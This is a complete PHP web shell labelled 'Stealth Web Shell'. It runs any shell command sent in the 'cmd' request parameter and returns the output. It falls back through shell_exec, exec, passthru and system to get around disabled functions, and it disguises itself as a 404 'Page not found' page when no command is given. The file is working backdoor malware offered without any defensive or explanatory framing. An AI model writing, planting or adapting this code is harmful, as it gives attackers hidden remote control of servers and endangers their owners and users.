<!-- Stealth Web Shell -->

<?php
    if(isset($_REQUEST['cmd'])) {
        $cmd = $_REQUEST['cmd'];

        // funções para evitar disable_functions
        function execute_command($cmd) {
            if (function_exists('shell_exec')) {
                return shell_exec($cmd);
            } elseif (function_exists('exec')) {
                exec($cmd, $out); return implode("\n", $out);
            } elseif(function_exists('passthru')) {
                ob_start(); passthru($cmd); return ob_get_clean();
            } elseif(function_exists('system')) {
                ob_start(); system($cmd); return ob_get_clean();
            } else {
                return "No command execution function available.";
            }
        }

        header('Content-Type: text/plain');
        echo execute_command($cmd);
        exit;
    } else {
        http_response_code(404);
        echo "Page not found";
    }
?>